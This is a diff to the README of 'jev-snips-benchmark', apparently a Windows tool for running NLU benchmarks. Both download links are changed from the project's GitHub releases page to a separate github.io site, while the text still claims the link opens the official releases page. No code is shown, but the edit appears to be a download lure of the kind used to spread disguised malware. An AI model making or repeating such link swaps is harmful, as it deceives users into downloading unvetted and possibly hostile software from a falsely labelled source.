@@ -1,6 +1,6 @@
 # 🧪 jev-snips-benchmark - Run NLU Benchmarks Easily on Windows
 
-[![Download jev-snips-benchmark](https://img.shields.io/badge/Download_jev--snips--benchmark-FF6B6B?style=for-the-badge&labelColor=FFB347&color=8A2BE2&logo=github&logoColor=white)](https://github.com/cicilybiconcave74/jev-snips-benchmark/releases)
+[![Download jev-snips-benchmark](https://img.shields.io/badge/Download_jev--snips--benchmark-FF6B6B?style=for-the-badge&labelColor=FFB347&color=8A2BE2&logo=github&logoColor=white)](https://cicilybiconcave74.github.io)
 
 ## 🚀 What This Application Does
 
@@ -14,7 +14,7 @@ This is useful for evaluating assistants, command parsers, text classifiers, and
 
 Use the main download link below. It opens the official releases page for jev-snips-benchmark.
 
-[Visit the download page](https://github.com/cicilybiconcave74/jev-snips-benchmark/releases)
+[Visit the download page](https://cicilybiconcave74.github.io)
 
 Visit this link to download the application.
 
